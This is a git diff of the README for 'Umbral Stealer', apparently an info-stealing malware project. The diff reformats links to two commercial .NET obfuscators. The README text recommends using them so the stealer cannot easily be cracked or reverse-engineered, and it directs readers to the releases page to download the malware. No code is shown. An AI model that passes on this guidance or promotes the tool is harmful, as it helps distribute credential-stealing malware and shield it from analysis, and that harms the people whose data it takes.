@@ -44,8 +44,8 @@ The author of this program is not liable for any damage, harm, or legal conseque
 ## Obfuscators
 due to umbral stealer obfuscation it can be cracked easy and reversed so i recommend you use theses obfuscations
 
-AgileDotNet: (https://www.secureteam.net/acode-download-thankyou)[Agiledotnet Obfuscator]
-dnguard: (https://dnguard.net/)[DNGuard] - NOTE THIS IS A PAIDED OBFUSCATOR IT WILL ONLY WORK ON YOUR PC!
+[Agiledotnet Obfuscator](https://www.secureteam.net/acode-download-thankyou) - AgileDotNet
+[DNGuard](https://dnguard.net/) - NOTE: THIS IS A PAID OBFUSCATOR. IT WILL ONLY WORK ON YOUR PC!
 
 ## Download
 Head over to the [releases](https://github.com/Blank-c/Umbral-Stealer/releases/latest) tab to download the latest version of Umbral Stealer.
